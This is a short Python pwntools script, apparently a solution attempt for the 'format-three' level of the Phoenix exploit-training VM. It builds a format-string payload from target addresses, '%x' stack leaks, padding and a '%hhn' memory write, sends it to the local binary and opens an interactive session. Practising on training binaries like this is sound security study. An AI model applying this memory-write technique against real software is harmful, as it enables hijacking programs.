# 
from pwn import *

# context.log_level = "debug"

p = process("/opt/phoenix/i486/format-three")

payload = b""
payload += 0x8049844.to_bytes(4, 'little')
payload += 0x8049845.to_bytes(4, 'little')
payload += 0x8049846.to_bytes(4, 'little')
payload += b"%x" * 10

payload += b"%x"
payload += b" " * 1000
payload += b"%x"
payload += b"%hhn"

# payload += b"%hhn"

# payload += b"%n"

# pause()
p.sendline(payload)
p.interactive()